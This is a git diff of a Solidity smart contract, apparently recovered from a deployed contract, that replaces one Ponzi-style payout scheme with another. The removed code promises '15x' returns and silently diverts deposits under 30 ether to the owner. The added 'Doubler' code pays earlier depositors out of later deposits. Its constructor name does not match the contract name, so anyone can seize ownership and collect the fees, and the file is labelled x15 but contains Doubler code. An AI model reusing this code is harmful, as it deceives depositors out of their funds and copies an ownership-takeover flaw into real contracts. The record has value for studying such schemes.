8c74f20aacdfe9027ea9c13b8e5b0dbf54d85362
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 09:53:29 +0700

    add contract x15

--- x15.sol
+++ x15.sol
@@ -1,64 +1,75 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract x15 at 0x9da7902394fb19ddd340d47398d35e3405bf79ec
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract x15 at 0xa39fcB48AdF288F143459d57A1A0756718C919Ae
 */
-//------------------------------------------------X15------------------------------------------------------------------------
-//
-// First 5 Depositors will Multiply their Ether by 15x!!!! The rest of the players will Earn 5x of their Deposits!!!
-//
-// Minimum Deposit: 30 Ether!
-//
-// It's crazy, with just 30 Ether Deposit you will Earn 450 Ether!
-//
-// Start Earning NOW!!!
-//
-//---------------------------------------------------------------------------------------------------------------------------
 contract x15{
-struct earnerarray{
-address etherAddress;
-uint amount;
-}
-earnerarray[] public crazyearners;
-uint public deposits_until_jackpot=0;
-uint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;
-address public kappa; modifier onlyowner{if(msg.sender==kappa)_}
-function x15(){
-kappa=msg.sender;
-}
-function(){
-enter();
-}
-function enter(){
-if(msg.value<30 ether){
-kappa.send(msg.value);
-return;
-}
-uint calculator; uint beta;
-uint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;
-deposits_until_jackpot=20-(totalearners%20);
-crazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;
-crazyearners[tot_pl].amount=amount;
-feeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;
-if(feeamount!=0){if(balance>feeamount){kappa.send(feeamount);balance-=feeamount;
-totalmoneyearned+=feeamount;if(alpha<100)alpha+=30;
-else {beta = alpha + crazyearners[tot_pl].amount; calculator= alpha+beta/2; alpha=100; }}} uint payout;uint nr=0;
 
+    struct Participant {
+        address etherAddress;
+        uint amount;
+    }
 
+    Participant[] public participants;
 
-while(balance>crazyearners[nr].amount*500/100 && nr<tot_pl)
-{
-if( (nr==0 || nr==1 || nr==2 || nr==3 || nr==4 )  &&  balance>crazyearners[nr].amount*1500/100)
-{
-payout=crazyearners[nr].amount*1500/100;
-crazyearners[nr].etherAddress.send(payout);
-balance-=crazyearners[nr].amount*1500/100;
-totalmoneyearned+=crazyearners[nr].amount*1500/100;
+    uint public payoutIdx = 0;
+    uint public collectedFees;
+    uint public balance = 0;
+
+    address public owner;
+
+    // simple single-sig function modifier
+    modifier onlyowner { if (msg.sender == owner) _ }
+
+    // this function is executed at initialization and sets the owner of the contract
+    function Doubler() {
+        owner = msg.sender;
+    }
+
+    // fallback function - simple transactions trigger this
+    function() {
+        enter();
+    }
+    
+    function enter() {
+        if (msg.value < 1 ether) {
+            msg.sender.send(msg.value);
+            return;
+        }
+
+      	// add a new participant to array
+        uint idx = participants.length;
+        participants.length += 1;
+        participants[idx].etherAddress = msg.sender;
+        participants[idx].amount = msg.value;
+        
+        // collect fees and update contract balance
+        if (idx != 0) {
+            collectedFees += msg.value / 30;
+            balance += msg.value;
+        } 
+        else {
+            // first participant has no one above him,
+            // so it goes all to fees
+            collectedFees += msg.value;
+        }
+
+	// if there are enough ether on the balance we can pay out to an earlier participant
+        if (balance > participants[payoutIdx].amount * 2) {
+            uint transactionAmount = 2 * (participants[payoutIdx].amount - participants[payoutIdx].amount / 30);
+            participants[payoutIdx].etherAddress.send(transactionAmount);
+
+            balance -= participants[payoutIdx].amount * 2;
+            payoutIdx += 1;
+        }
+    }
+
+    function collectFees() onlyowner {
+        if (collectedFees == 0) return;
+
+        owner.send(collectedFees);
+        collectedFees = 0;
+    }
+
+    function setOwner(address _owner) onlyowner {
+        owner = _owner;
+    }
 }
-else
-{
-payout=crazyearners[nr].amount*500/100;
-crazyearners[nr].etherAddress.send(payout);
-balance-=crazyearners[nr].amount*500/100;
-totalmoneyearned+=crazyearners[nr].amount*500/100;
-}
-nr+=1;
-}}}
